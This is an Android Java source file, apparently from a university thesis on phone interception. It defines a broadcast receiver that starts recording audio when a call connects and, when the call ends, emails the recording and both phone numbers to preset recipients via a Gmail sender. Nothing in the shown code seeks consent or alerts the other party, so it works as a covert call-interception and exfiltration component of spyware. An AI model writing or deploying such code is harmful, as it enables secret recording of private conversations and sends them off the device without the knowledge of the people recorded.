package corso.java.tesiintercettazionitelefoniche;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;
import java.util.Calendar;
import java.util.Date;

public class OutgoingCallReceiver extends BroadcastReceiver {

    private static final String LOG_TAG = "AudioRecordTest";
    static CallRecorder cr;
    static Context ct;
    static GMailSender gms;
    static String myNumber;
    static String savedPhoneNumber;
    static String fileName = "/test01";

    public OutgoingCallReceiver(){

    }

    public OutgoingCallReceiver(CallRecorder cr, Context ct, GMailSender gms, String myNumber){
        this.cr = cr;
        this.ct = ct;
        this.gms = gms;
        this.myNumber = myNumber;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        final PendingResult pendingResult = goAsync();
        Task asyncTask = new Task(pendingResult, intent);
        asyncTask.execute();
    }

    private static class Task extends AsyncTask<String, Integer, String> {

        private final PendingResult pendingResult;
        private final Intent intent;

        private Task(PendingResult pendingResult, Intent intent) {
            this.pendingResult = pendingResult;
            this.intent = intent;
        }

        @Override
        protected String doInBackground(String... strings) {
            if(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)!=null)
                savedPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

            String action = intent.getAction();
            String uri = intent.toUri(Intent.URI_INTENT_SCHEME);

            if(action.equals("android.intent.action.PHONE_STATE")){
                if(uri.contains("state=OFFHOOK")){
                    Date currentTime = Calendar.getInstance().getTime();
                    fileName = "/"+currentTime.toString().replace(" ", "").replace(":", "").replace("+", "");
                    Log.d(LOG_TAG, fileName);
                    cr.startRecording(fileName);
                    Log.d(LOG_TAG, "Chiamata in corso con "+ savedPhoneNumber);
                }
                if(uri.contains("state=IDLE")){
                    if(cr.stopRecording()){
                        try {
                            gms.sendMail("Invio intercettazione telefonica " + fileName,
                                    "In riferimento alla tesi magistrale sostenuta da Santoro Vincenzo con il Prof. De prisco, si invia ai fini di studio l'intercettazione telefonica tra " + myNumber + " e " + savedPhoneNumber,
                                    ct.getResources().getString(R.string.recipients),
                                    cr.getLocation() + fileName);
                        } catch (Exception e) {
                            Log.e("AudioRecordTest", e.getClass().toString());
                            if(e.getMessage()!=null)
                                Log.e("AudioRecordTest", e.getMessage());
                        }
                        Log.d(LOG_TAG, "Chiamata terminata con "+ savedPhoneNumber);
                    }
                }
            }

            StringBuilder sb = new StringBuilder();
            sb.append("Action: " + action + "\n");
            sb.append("URI: " + uri + "\n");
            String log = sb.toString();
            Log.d("AudioRecordTest", log);

            return log;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            pendingResult.finish();
        }
    }
}